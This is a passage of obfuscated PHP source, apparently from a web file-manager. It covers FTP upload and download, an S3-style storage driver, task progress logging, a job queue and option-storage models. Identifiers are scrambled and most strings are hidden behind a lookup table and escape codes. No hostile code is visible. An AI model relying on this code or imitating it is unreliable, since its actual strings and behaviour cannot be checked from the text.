curl_exec($«ŸŠıÖ); curl_close($«ŸŠıÖ); return $ÛØÑà”; } public function upload($²¸ı¢É, $¼¸¡‡µ©, $ÀÏÖã  = false, $®ÌÕÂóŸ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($²¸ı¢É))) { return !1; } $²¸ı¢É = $this->iconvSystem($²¸ı¢É); $¼¸¡‡µ© = $this->iconvSystem($¼¸¡‡µ©); $²í‚ÍŞÄ = ftp_nb_put($this->connect, $²¸ı¢É, $¼¸¡‡µ©, FTP_BINARY); while ($²í‚ÍŞÄ == FTP_MOREDATA) { $²í‚ÍŞÄ = ftp_nb_continue($this->connect); } if ($²í‚ÍŞÄ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); return !1; } return $this->getPathOuter($²¸ı¢É); } public function download($òÍòÃÇÔ, $À˜ò‹­¹ = '') { if (!$this->_isconn()) { return !1; } $ÎØØ¹îÏ = $this->pathFather($À˜ò‹­¹); if (!IO::mkdir($ÎØØ¹îÏ)) { return !1; } $òÍòÃÇÔ = $this->iconvSystem($òÍòÃÇÔ); $À˜ò‹­¹ = $this->iconvSystem($À˜ò‹­¹); $Ò±¨Ûİ³ = ftp_nb_get($this->connect, $À˜ò‹­¹, $òÍòÃÇÔ, FTP_BINARY); while ($Ò±¨Ûİ³ == FTP_MOREDATA) { $Ò±¨Ûİ³ = ftp_nb_continue($this->connect); } if ($Ò±¨Ûİ³ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); return !1; } return $this->iconvApp($À˜ò‹­¹); } public function exist($ÄÕÊ™ÆÏ) { return $this->isFile($ÄÕÊ™ÆÏ) || $this->isFolder($ÄÕÊ™ÆÏ); } public function isFile($ÎË«îâô) { return !$this->isFolder($ÎË«îâô) && $this->objectMeta($ÎË«îâô); } public function isFolder($¶ä‡ëÙí) { return $this->cacheMethod($_SERVER[¯‘·½][180], $¶ä‡ëÙí); } protected function objectMeta($¢«¡ˆÍ) { return $this->cacheMethod($_SERVER[¯‘·½][182], $¢«¡ˆÍ); } protected function _objectMeta($µçâæÊ) { $”êñş«ò =& $_SERVER[¯‘·½]; if ($µçâæÊ == $”êñş«ò[12] || $µçâæÊ == $”êñş«ò[8]) { return array(); } if (!$this->_isconn()) { return !1; } $µçâæÊ = $this->iconvSystem($µçâæÊ); $÷çô¾· = array($”êñş«ò[32] => $this->iconvApp($µçâæÊ), $”êñş«ò[33] => $”êñş«ò[233], $”êñş«ò[79] => 0); $ìş˜úÊÙ = @ftp_size($this->connect, $µçâæÊ); if ($ìş˜úÊÙ != -1) { $÷çô¾·[$”êñş«ò[79]] = $ìş˜úÊÙ; } else { $”Ø½Ë = @ftp_chdir($this->connect, $µçâæÊ); if (!$”Ø½Ë) { return !1; } @ftp_chdir($this->connect, $”êñş«ò[8]); $÷çô¾·[$”êñş«ò[33]] = $”êñş«ò[78]; } return $÷çô¾·; } protected function _isFolder($ö»õÂ÷·) { $ê‘•€üû =& $_SERVER[¯‘·½]; if ($ö»õÂ÷· == $ê‘•€üû[12] || $ö»õÂ÷· == $ê‘•€üû[8]) { return !0; } $Ïˆ¿ğÏÙ = $this->_objectMeta($ö»õÂ÷·); return isset($Ïˆ¿ğÏÙ[$ê‘•€üû[33]]) && $Ïˆ¿ğÏÙ[$ê‘•€üû[33]] == $ê‘•€üû[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($æè•‡Ö¢) { parent::__construct($æè•‡Ö¢); $this->setSignVersion($_SERVER[¯‘·½][250]); } public function uploadLink($ß†ÍòÄŞ, $³şİÉüÈ = 0) { $¬¸ĞÚ‰¦ =& $_SERVER[¯‘·½]; if ($this->isUploadServer()) { return; } $‹±É¤öÉ = $this->getType(); if (!in_array($‹±É¤öÉ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $—¾™ï¼ğ = (!$³şİÉüÈ ? 1 : ceil($³şİÉüÈ / pow(1024, 3))) * 3600 * 4; $›Ó­·İ = $this->uploadMultiData($ß†ÍòÄŞ, $—¾™ï¼ğ); if ($›Ó­·İ) { $›Ó­·İ[$¬¸ĞÚ‰¦[97]] = $ß†ÍòÄŞ; $›Ó­·İ[$¬¸ĞÚ‰¦[98]] = $‹±É¤öÉ; } return $›Ó­·İ; } public function fileOutImage($Çê¶Ë‰, $ Îõ˜‹— = 250) { if ($this->size($Çê¶Ë‰) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Çê¶Ë‰, $ Îõ˜‹—); } $­³¥Ö»ï = $this->link($Çê¶Ë‰); $­³¥Ö»ï .= $_SERVER[¯‘·½][1485] . $ Îõ˜‹—; $this->fileOutLink($­³¥Ö»ï); } } goto cÁ­…ù¢Î‚; CåÉ‰ï·‹: class TaskHttp extends Task { protected function startAfter() { $“Û’Ğêµ =& $_SERVER[¯‘·½]; $ğ££àÉ­ =& $this->task; $ğ££àÉ­[$“Û’Ğêµ[1884]] = 1; Hook::bind($“Û’Ğêµ[1852], array($this, $“Û’Ğêµ[1885])); Hook::bind($“Û’Ğêµ[1854], array($this, $“Û’Ğêµ[1886])); Hook::bind($“Û’Ğêµ[1856], array($this, $“Û’Ğêµ[1887])); } protected function endAfter() { $íÊ©‰¸‡ =& $_SERVER[¯‘·½]; Hook::unbind($íÊ©‰¸‡[1852], array($this, $íÊ©‰¸‡[1885])); Hook::unbind($íÊ©‰¸‡[1854], array($this, $íÊ©‰¸‡[1886])); Hook::unbind($íÊ©‰¸‡[1856], array($this, $íÊ©‰¸‡[1887])); } public function progressStart($óã¸å¨Ú) { $µÁÓª¢ =& $_SERVER[¯‘·½]; $€œåâ¡ñ = curl_getinfo($óã¸å¨Ú); self::log($µÁÓª¢[1888] . $€œåâ¡ñ[$µÁÓª¢[384]]); self::valueSet($this->task[$µÁÓª¢[477]], $this->task); } public function progressEnd($¥Œ‹Ë›) { $œñè  ° =& $_SERVER[¯‘·½]; self::log($œñè  °[1889] . $this->task[$œñè  °[477]]); $this->end(); } public function progress($ï¹úÙœ‰, $£ß˜³ùÕ, $‰ğƒ·€, $æÂšéÌÒ, $óíÚŠ¤) { $´Â¡µÓ— =& $_SERVER[¯‘·½]; $èç…Ïö =& $this->task; if ($óíÚŠ¤ > 0) { $èç…Ïö[$´Â¡µÓ—[1159]] = $èç…Ïö[$´Â¡µÓ—[1159]] == 0 ? $æÂšéÌÒ : $èç…Ïö[$´Â¡µÓ—[1159]]; $èç…Ïö[$´Â¡µÓ—[1807]] = $óíÚŠ¤; } else { if ($‰ğƒ·€ > 0) { $èç…Ïö[$´Â¡µÓ—[1159]] = $èç…Ïö[$´Â¡µÓ—[1159]] == 0 ? $£ß˜³ùÕ : $èç…Ïö[$´Â¡µÓ—[1159]]; $èç…Ïö[$´Â¡µÓ—[1807]] = $‰ğƒ·€; } } $this->update(); self::log("\x70\x72\157\147\x72\x65\163\x73\x48\164\164\x70\x3a\144\157\167\156\x3a{$‰ğƒ·€}\57{$£ß˜³ùÕ}\x3b\40\x75\x70\154\157\x61\144\72{$óíÚŠ¤}\x2f{$æÂšéÌÒ}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($‚ùæ¾š€, $Ğõ±Ôö = '', $¢ğõ×ôÀ = 0, $ë÷°¤Ö© = '') { $Œê°î™Ì =& $_SERVER[¯‘·½]; $ë÷°¤Ö© = $ë÷°¤Ö© ? $ë÷°¤Ö© : ($Ğõ±Ôö ? $Ğõ±Ôö : $‚ùæ¾š€); $¹è°ß Ø = new Task($‚ùæ¾š€, $Ğõ±Ôö, $¢ğõ×ôÀ, $ë÷°¤Ö©); $GLOBALS[$Œê°î™Ì[1890] . $‚ùæ¾š€] = new TaskLog($Œê°î™Ì[1789], $¹è°ß Ø, $ë÷°¤Ö©); return $¹è°ß Ø; } public function __construct($µ¢Ñìƒ = '', $ƒ¼™ËŞñ = '', $²Ñ¹ò¨• = '') { $‘¨ü¿Ğİ =& $_SERVER[¯‘·½]; if (!$µ¢Ñìƒ) { $µ¢Ñìƒ = $‘¨ü¿Ğİ[1789]; } $›‚ä½¬º = $µ¢Ñìƒ . $‘¨ü¿Ğİ[464] . rand_string(10); if (!$²Ñ¹ò¨•) { $²Ñ¹ò¨• = $µ¢Ñìƒ . $‘¨ü¿Ğİ[53] . $²Ñ¹ò¨•; } switch ($µ¢Ñìƒ) { case $‘¨ü¿Ğİ[1789]: if (!$ƒ¼™ËŞñ || !$ƒ¼™ËŞñ->task) { return echoLog($µ¢Ñìƒ . $‘¨ü¿Ğİ[1891]); } $Šúñ·ª  = $ƒ¼™ËŞñ; $›‚ä½¬º = $Šúñ·ª ->task[$‘¨ü¿Ğİ[477]]; $µ¢Ñìƒ = $Šúñ·ª ->task[$‘¨ü¿Ğİ[477]]; if (!$Šúñ·ª ->task[$‘¨ü¿Ğİ[1693]]) { $Šúñ·ª ->task[$‘¨ü¿Ğİ[1693]] = $²Ñ¹ò¨• ? $²Ñ¹ò¨• : $µ¢Ñìƒ; } break; case $‘¨ü¿Ğİ[1892]: if (!$ƒ¼™ËŞñ) { return echoLog($µ¢Ñìƒ . $‘¨ü¿Ğİ[1893]); } $½Êâ‘§‹ = is_string($ƒ¼™ËŞñ) ? array($ƒ¼™ËŞñ) : $ƒ¼™ËŞñ; $Šúñ·ª  = new TaskFileTransfer($›‚ä½¬º, $µ¢Ñìƒ, 0, $²Ñ¹ò¨• ? $²Ñ¹ò¨• : $½Êâ‘§‹[0]); foreach ($½Êâ‘§‹ as $ …æ¨‘ß) { $Šúñ·ª ->addPath($ …æ¨‘ß); } break; case $‘¨ü¿Ğİ[390]: if (!$ƒ¼™ËŞñ) { return echoLog($µ¢Ñìƒ . $‘¨ü¿Ğİ[1893]); } $½Êâ‘§‹ = is_string($ƒ¼™ËŞñ) ? array($ƒ¼™ËŞñ) : $ƒ¼™ËŞñ; $Šúñ·ª  = new TaskZip($›‚ä½¬º, $µ¢Ñìƒ, 0, $²Ñ¹ò¨• ? $²Ñ¹ò¨• : $½Êâ‘§‹[0]); foreach ($½Êâ‘§‹ as $ …æ¨‘ß) { $Šúñ·ª ->addPath($ …æ¨‘ß); } break; case $‘¨ü¿Ğİ[1323]: if (!$ƒ¼™ËŞñ) { return echoLog($µ¢Ñìƒ . $‘¨ü¿Ğİ[1893]); } $Šúñ·ª  = new TaskUnZip($›‚ä½¬º, $µ¢Ñìƒ, 0, $²Ñ¹ò¨• ? $²Ñ¹ò¨• : $ƒ¼™ËŞñ); if ($ƒ¼™ËŞñ) { $Šúñ·ª ->addFile($ƒ¼™ËŞñ); } break; case $‘¨ü¿Ğİ[152]: $Šúñ·ª  = new TaskHttp($›‚ä½¬º, $µ¢Ñìƒ); break; default: return; break; } $this->task = $Šúñ·ª ; $this->taskID = $›‚ä½¬º; Hook::bind($‘¨ü¿Ğİ[1827], array($this, $‘¨ü¿Ğİ[1894])); Hook::bind($‘¨ü¿Ğİ[1829], array($this, $‘¨ü¿Ğİ[1895])); Hook::bind($‘¨ü¿Ğİ[1823], array($this, $‘¨ü¿Ğİ[1896])); echoLog($‘¨ü¿Ğİ[1897] . $Šúñ·ª ->task[$‘¨ü¿Ğİ[1693]]); } public function __destruct() { $this->end(); } public function end($Ÿ°ë‚±ì = '') { $¨÷ô©â† =& $_SERVER[¯‘·½]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ÿ°ë‚±ì); $this->task = !1; $this->taskID = !1; Hook::unbind($¨÷ô©â†[1827], array($this, $¨÷ô©â†[1894])); Hook::unbind($¨÷ô©â†[1829], array($this, $¨÷ô©â†[1895])); Hook::unbind($¨÷ô©â†[1823], array($this, $¨÷ô©â†[1896])); } public function taskUpdate($ƒ–ß–¼) { $òêô–Ë =& $_SERVER[¯‘·½]; if (!$ƒ–ß–¼ || $this->taskID != $ƒ–ß–¼[$òêô–Ë[477]]) { return; } $Ç¿™š Œ = 20; $õÛ‘¶¡ = intval($ƒ–ß–¼[$òêô–Ë[1808]] * $Ç¿™š Œ); $šíì¯É½ = $òêô–Ë[176] . str_repeat($òêô–Ë[508], $õÛ‘¶¡) . $òêô–Ë[1110] . str_repeat($òêô–Ë[53], $Ç¿™š Œ - $õÛ‘¶¡) . $òêô–Ë[178]; $¼¸ñ–Ü = $šíì¯É½ . sprintf($òêô–Ë[1898], $ƒ–ß–¼[$òêô–Ë[1808]] * 100) . $òêô–Ë[1899]; $¿®÷îç‡ = $¼¸ñ–Ü . $ƒ–ß–¼[$òêô–Ë[1807]] . $òêô–Ë[8] . $ƒ–ß–¼[$òêô–Ë[1159]] . LNG($òêô–Ë[1900]); $Ö®Ş§–¨ = $òêô–Ë[12]; if ($ƒ–ß–¼[$òêô–Ë[1884]]) { $¿®÷îç‡ = $¼¸ñ–Ü . size_format($ƒ–ß–¼[$òêô–Ë[1807]]) . $òêô–Ë[8] . size_format($ƒ–ß–¼[$òêô–Ë[1159]]); $Ö®Ş§–¨ = size_format($ƒ–ß–¼[$òêô–Ë[1809]]) . $òêô–Ë[1901]; } if ($ƒ–ß–¼[$òêô–Ë[1161]]) { $ƒ–ß–¼[$òêô–Ë[1858]] = $ƒ–ß–¼[$òêô–Ë[1161]] . $òêô–Ë[53] . $ƒ–ß–¼[$òêô–Ë[1858]]; } if ($ƒ–ß–¼[$òêô–Ë[1858]]) { $¶’‘™¥ş = $òêô–Ë[12]; if ($ƒ–ß–¼[$òêô–Ë[1860]]) { $¶’‘™¥ş = $òêô–Ë[50] . size_format($ƒ–ß–¼[$òêô–Ë[1861]]) . $òêô–Ë[8] . size_format($ƒ–ß–¼[$òêô–Ë[1860]]); } $Ö®Ş§–¨ .= $ƒ–ß–¼[$òêô–Ë[1858]] . $¶’‘™¥ş; } if ($ƒ–ß–¼[$òêô–Ë[849]] && !$ƒ–ß–¼[$òêô–Ë[1860]]) { $Ö®Ş§–¨ .= $òêô–Ë[53] . size_format($ƒ–ß–¼[$òêô–Ë[1865]]) . $òêô–Ë[8] . size_format($ƒ–ß–¼[$òêô–Ë[849]]); } echoLog($¿®÷îç‡ . $òêô–Ë[53] . $Ö®Ş§–¨, !0); } public function taskEnd($¤”º†İ) { $ï²“àú® =& $_SERVER[¯‘·½]; if (!$¤”º†İ || $this->taskID != $¤”º†İ[$ï²“àú®[477]]) { return; } $öË”³ÊŠ = $¤”º†İ ? LNG($ï²“àú®[1902]) . $ï²“àú®[4] . $¤”º†İ[$ï²“àú®[1807]] . $ï²“àú®[8] . $¤”º†İ[$ï²“àú®[1159]] . LNG($ï²“àú®[1900]) . $ï²“àú®[74] : $ï²“àú®[12]; echoLog($ï²“àú®[1903] . $¤”º†İ[$ï²“àú®[1693]] . ($¤”º†İ[$ï²“àú®[528]] ? $ï²“àú®[74] . $¤”º†İ[$ï²“àú®[528]] : $ï²“àú®[12]) . $ï²“àú®[74] . $öË”³ÊŠ . $ï²“àú®[1904] . sprintf($ï²“àú®[943], timeFloat() - $¤”º†İ[$ï²“àú®[1810]]) . $ï²“àú®[1822]); $this->end(); } public function taskKill($ñµ£‚«†) { $ÂÉ¢¶ô· =& $_SERVER[¯‘·½]; if (!$ñµ£‚«† || $this->taskID != $ñµ£‚«†[$ÂÉ¢¶ô·[477]]) { return; } echoLog($ÂÉ¢¶ô·[1905] . $ñµ£‚«†[$ÂÉ¢¶ô·[1693]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\165\x65\165\x65\x4c\145\156\147\x74\x68"; const QUEUE_DATA = "\164\141\163\x6b\121\x75\x65\165\x65\x44\x61\164\x61"; const QUEUE_TIME = "\164\141\163\153\x51\165\x65\x75\145\x4c\x61\163\x74\x52\165\156"; const QUEUE_THREAD = "\x74\x61\163\153\x51\165\x65\165\145\x54\150\x72\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($·÷–úÑû, $¸ÍÉæ = array(), $ÌÚâ÷ÓÄ = '', $™¡†èèà = '') { $ûµüÚŒ¼ =& $_SERVER[¯‘·½]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($™¡†èèà && array_find_by_field(self::$listData, $ûµüÚŒ¼[97], $™¡†èèà)) { return !0; } if ($™¡†èèà && array_find_by_field(self::$listDataAdd, $ûµüÚŒ¼[97], $™¡†èèà)) { return !0; } self::$listDataAdd[] = array($ûµüÚŒ¼[344] => $·÷–úÑû, $ûµüÚŒ¼[1906] => $¸ÍÉæ, $ûµüÚŒ¼[528] => $ÌÚâ÷ÓÄ, $ûµüÚŒ¼[97] => $™¡†èèà); return !0; } public static function addSubmit() { $©³ó¿Áñ =& $_SERVER[¯‘·½]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($©³ó¿Áñ[1907] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $©³ó¿Áñ[12], $©³ó¿Áñ[528])), $©³ó¿Áñ[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($¶‰Èüßû, $•ŠìÈŸÔ = array(), $íÍŞŠ = '', $«×õõª = '') { $‹ÉÈ˜Ôé =& $_SERVER[¯‘·½]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ûéˆó­Ÿ = self::getAll(); if ($«×õõª && array_find_by_field($ûéˆó­Ÿ, $‹ÉÈ˜Ôé[97], $«×õõª)) { return !0; } $ûéˆó­Ÿ[] = array($‹ÉÈ˜Ôé[344] => $¶‰Èüßû, $‹ÉÈ˜Ôé[1906] => $•ŠìÈŸÔ, $‹ÉÈ˜Ôé[528] => $íÍŞŠ, $‹ÉÈ˜Ôé[97] => $«×õõª); self::setAll($ûéˆó­Ÿ); write_log($‹ÉÈ˜Ôé[1907] . $íÍŞŠ, $‹ÉÈ˜Ôé[198]); return !0; } public static function run() { $ï·öò€º =& $_SERVER[¯‘·½]; $£¨«„Û” = self::getAll(); $Œ‡Ó¶ù = array_shift($£¨«„Û”); if (!$Œ‡Ó¶ù) { return !1; } self::setAll($£¨«„Û”); $ûş‹û­ö = timeFloat(); $Ì¯±¢ê = $ï·öò€º[12]; try { $Ì¯±¢ê = Hook::apply($Œ‡Ó¶ù[$ï·öò€º[344]], $Œ‡Ó¶ù[$ï·öò€º[1906]]); } catch (Exception $½¹§Êáª) { write_log($½¹§Êáª, $ï·öò€º[1288]); } $¢¬ÕÑíÄ = number_format(timeFloat() - $ûş‹û­ö, 3) . $ï·öò€º[1822]; if ($Ì¯±¢ê && is_string($Ì¯±¢ê)) { $¢¬ÕÑíÄ = $¢¬ÕÑíÄ . $ï·öò€º[1908] . $Ì¯±¢ê; } write_log($ï·öò€º[1909] . $Œ‡Ó¶ù[$ï·öò€º[528]] . $ï·öò€º[1910] . $¢¬ÕÑíÄ, $ï·öò€º[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $éç«¹µÁ =& $_SERVER[¯‘·½]; $§»Õ‰ş– = self::threadCount() + 1; if ($§»Õ‰ş– > 3 || !self::count()) { return; } write_log($éç«¹µÁ[1911] . $§»Õ‰ş–, $éç«¹µÁ[198]); Cache::set(self::QUEUE_THREAD, $§»Õ‰ş–, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($éç«¹µÁ[1912], $éç«¹µÁ[198]); } public static function getKey($«ºˆ¬âí, $øÚıı¬é = "\x69\156\x74") { $çêîóÂô =& $_SERVER[¯‘·½]; Cache::removeMemory($«ºˆ¬âí); $ÀÕ¼Òòö = Cache::get($«ºˆ¬âí); if ($øÚıı¬é == $çêîóÂô[366]) { return $ÀÕ¼Òòö ? intval($ÀÕ¼Òòö) : 0; } if ($øÚıı¬é == $çêîóÂô[1913]) { return is_array($ÀÕ¼Òòö) ? $ÀÕ¼Òòö : array(); } return $ÀÕ¼Òòö; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¯‘·½][1913]); } public static function setAll($•‚íƒ—•) { $¸‹şÚË† = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($•‚íƒ—•), $¸‹şÚË†); Cache::set(self::QUEUE_DATA, $•‚íƒ—•, $¸‹şÚË†); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto c·¼„óß; C¬Å°¦Ş¾: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\x6d\x4f\160\164\151\157\156"; public $field = array(); public function listData($–§Şçğ¹ = false, $À‘ê¹ú¿ = "\155\x6f\144\x69\146\171\x54\x69\155\x65", $ÜÑ’·™¿ = false) { $”üÍÑõİ = Model($this->modelType)->get(!1, $this->optionType, !0); $‘¤åÙ… = array_values($”üÍÑõİ); if ($‘¤åÙ… && $‘¤åÙ…[0] && !is_array($‘¤åÙ…[0])) { Model($this->modelType)->cacheRemove($this->optionType); $”üÍÑõİ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$”üÍÑõİ) { return $–§Şçğ¹ ? null : array(); } if (!$–§Şçğ¹) { $”üÍÑõİ = array_filter(array_values($”üÍÑõİ)); return array_sort_by($”üÍÑõİ, $À‘ê¹ú¿, $ÜÑ’·™¿); } return $”üÍÑõİ[$_SERVER[¯‘·½][474] . $–§Şçğ¹]; } public function insert($ÔûÇÛù³) { $Ÿ­ÎÒæ„ =& $_SERVER[¯‘·½]; $ÔûÇÛù³ = array_field_key($ÔûÇÛù³, $this->field); $»İİÖ‚ù = Model($this->modelType)->get($Ÿ­ÎÒæ„[475], $this->optionType . $Ÿ­ÎÒæ„[476]); $»İİÖ‚ù = $»İİÖ‚ù ? $»İİÖ‚ù : 0; $ÔûÇÛù³[$Ÿ­ÎÒæ„[477]] = ++$»İİÖ‚ù; $ÔûÇÛù³[$Ÿ­ÎÒæ„[234]] = time(); $ÔûÇÛù³[$Ÿ­ÎÒæ„[88]] = time(); Model($this->modelType)->set($Ÿ­ÎÒæ„[475], $»İİÖ‚ù, $this->optionType . $Ÿ­ÎÒæ„[476]); Model($this->modelType)->set($Ÿ­ÎÒæ„[474] . $»İİÖ‚ù, $ÔûÇÛù³, $this->optionType); return $»İİÖ‚ù; } public function update($ÔíîÍöˆ, $ô¸À¿°Š) { $‰ºÂâîü =& $_SERVER[¯‘·½]; $ô¸À¿°Š = array_field_key($ô¸À¿°Š, $this->field); $õßõ£“Ê = $this->listData($ÔíîÍöˆ); if (!$õßõ£“Ê || !$ÔíîÍöˆ) { return !1; } $ô¸À¿°Š = array_merge($õßõ£“Ê, $ô¸À¿°Š); $ô¸À¿°Š[$‰ºÂâîü[88]] = time(); return Model($this->modelType)->set($‰ºÂâîü[474] . $ÔíîÍöˆ, $ô¸À¿°Š, $this->optionType); } public function remove($¾ÏÊË´÷) { if (!$¾ÏÊË´÷) { return !1; } return Model($this->modelType)->remove($_SERVER[¯‘·½][474] . $¾ÏÊË´÷, $this->optionType); } public function clear() { $¥¥ôú€£ =& $_SERVER[¯‘·½]; Model($this->modelType)->remove($¥¥ôú€£[475], $this->optionType . $¥¥ôú€£[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($…¯‡¶Æù, $ÃÌ“»¢ö) { if (!$ÃÌ“»¢ö) { return !1; } $·˜ŸŠÂ = $this->listData(); $·˜ŸŠÂ = array_to_keyvalue($·˜ŸŠÂ, $…¯‡¶Æù); return isset($·˜ŸŠÂ[$ÃÌ“»¢ö]) ? $·˜ŸŠÂ[$ÃÌ“»¢ö] : !1; } public function findByName($Åä–ƒÓ) { return $this->findByKey($_SERVER[¯‘·½][32], $Åä–ƒÓ); } protected function resetData($ƒæÜÀƒ) { $ºÈÎ·ò« =& $_SERVER[¯‘·½]; $ƒæÜÀƒ = is_array($ƒæÜÀƒ) ? $ƒæÜÀƒ : array(); $›€ùì‚Ø = array(); for ($ÒÑÄÓ¡à = 0; $ÒÑÄÓ¡à < count($ƒæÜÀƒ); $ÒÑÄÓ¡à++) { $›€ùì‚Ø[$ºÈÎ·ò«[474] . $ƒæÜÀƒ[$ÒÑÄÓ¡à][$ºÈÎ·ò«[477]]] = $ƒæÜÀƒ[$ÒÑÄÓ¡à]; } return Model($this->modelType)->set($›€ùì‚Ø, !1, $this->optionType); } private function getAutoName($º–¯´ú¤) { $Ôº‘Ãå‹ = array_to_keyvalue($this->listData(), $_SERVER[¯‘·½][32]); if (!$Ôº‘Ãå‹ || !isset($Ôº‘Ãå‹[$º–¯´ú¤])) { return $º–¯´ú¤; } for ($ÉæµºğÌ = 1; $ÉæµºğÌ < count($Ôº‘Ãå‹); $ÉæµºğÌ++) { $ËéÍäŒé = $º–¯´ú¤ . "\x28{$ÉæµºğÌ}\51"; if (!isset($Ôº‘Ãå‹[$ËéÍäŒé])) { return $ËéÍäŒé; } } return $ËéÍäŒé; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($æŠÍ ü´ = false, $¦Óê‹¨Ì = '', $ÄÑıÒ„• = false) { $ ú®ëüÂ =& $_SERVER[¯‘·½]; $ÃºÏ¥ñ = $this->cacheGet($¦Óê‹¨Ì); $¶±›úºÂ = $this->optionDefault($¦Óê‹¨Ì); $¶±›úºÂ = is_array($¶±›úºÂ) ? $¶±›úºÂ : array(); if (is_array($ÃºÏ¥ñ)) { $ÃºÏ¥ñ = array_merge($¶±›úºÂ, $ÃºÏ¥ñ); return $æŠÍ ü´ ? isset($ÃºÏ¥ñ[$æŠÍ ü´]) ? $ÃºÏ¥ñ[$æŠÍ ü´] : null : $ÃºÏ¥ñ; } $Ò—šš‘ = $this->filterWhere(array($ ú®ëüÂ[33] => $¦Óê‹¨Ì)); $ÃºÏ¥ñ = $this->where($Ò—šš‘)->select(); $ÃºÏ¥ñ = array_to_keyvalue($ÃºÏ¥ñ, $ ú®ëüÂ[97], $ ú®ëüÂ[452]); foreach ($ÃºÏ¥ñ as $ÏŞ§í => $ÓŠ´§Ç¸) { if ($ÄÑıÒ„• || in_array($ÏŞ§í, $this->jsonField)) { $ÃºÏ¥ñ[$ÏŞ§í] = json_decode($ÓŠ´§Ç¸, !0); } } $this->cacheSet($¦Óê‹¨Ì, $ÃºÏ¥ñ); $ÃºÏ¥ñ = array_merge($¶±›úºÂ, $ÃºÏ¥ñ); return $æŠÍ ü´ ? $ÃºÏ¥ñ[$æŠÍ ü´] : $ÃºÏ¥ñ; } public function set($ŞĞ¯¿õâ, $š«ûÕä = false, $ñ“”ô¨– = '') { $Ñ ’Û =& $_SERVER[¯‘·½]; $this->cacheRemove($ñ“”ô¨–); $‘ÅÍœŸ = array(); $ı§í°èò = is_array($ŞĞ¯¿õâ) ? $ŞĞ¯¿õâ : array($ŞĞ¯¿õâ => $š«ûÕä); foreach ($ı§í°èò as $áô‚Ó š => $±°ç¤éˆ) { if (is_array($±°ç¤éˆ)) { $±°ç¤éˆ = json_encode_force($±°ç¤éˆ); } $this->checkLength($±°ç¤éˆ, !1, $this->tableName . $Ñ ’Û[4] . $ŞĞ¯¿õâ); $±°ç¤éˆ = self::textEncode($±°ç¤éˆ); $ı§í°èò = array($Ñ ’Û[33] => $ñ“”ô¨–, $Ñ ’Û[97] => $áô‚Ó š, $Ñ ’Û[452] => $±°ç¤éˆ); $‘ÅÍœŸ[] = $this->filterWhere($ı§í°èò); } if (!$‘ÅÍœŸ) { return !0; } $–×‡ÌªÂ = $this->cacheKey($Ñ ’Û[478]); CacheLock::lock($–×‡ÌªÂ); $Êò«– = $this->addAll($‘ÅÍœŸ, array(), !0); CacheLock::unlock($–×‡ÌªÂ); return $Êò«–; } protected function optionDefault($Ó“²¥ÕÇ = '') { return !1; } public function setDeep($ªÊÃı¦´, $°ô´àüÇ = false, $¯Å–î°è = '') { $ĞÚº’ùœ = explode($_SERVER[¯‘·½][10], $ªÊÃı¦´); $Ì˜Êäàå = $this->get(); array_set_value($Ì˜Êäàå, $ªÊÃı¦´, $°ô´àüÇ); $this->set($ĞÚº’ùœ[0], $Ì˜Êäàå[$ĞÚº’ùœ[0]], $¯Å–î°è); } public function remove($¼ú‡¦©•, $¿¾ú×Üù = '') { $‹í™ß‚î =& $_SERVER[¯‘·½]; $this->cacheRemove($¿¾ú×Üù); $•àÜ¯—€ = $this->filterWhere(array($‹í™ß‚î[97] => $¼ú‡¦©•, $‹í™ß‚î[33] => $¿¾ú×Üù)); if (is_null($¼ú‡¦©•)) { unset($•àÜ¯—€[$‹í™ß‚î[97]]); } return $this->where($•àÜ¯—€)->delete(); } public function cacheSet($°”»¾ÑÍ, $ìóåºòƒ = false) { return Cache::set($this->cacheKey($°”»¾ÑÍ), $ìóåºòƒ); } public function cacheGet($«ÙˆäÛß) { return Cache::get($this->cacheKey($«ÙˆäÛß)); } public function cacheRemove($óåò•Â) { return Cache::remove($this->cacheKey($óåò•Â)); } protected function filterWhere($¬²¦‹œ˜) { return $¬²¦‹œ˜; } protected function cacheKey($ÙÅ¶µ½) { return $ÙÅ¶µ½; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\x63\145"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\155\x65" => 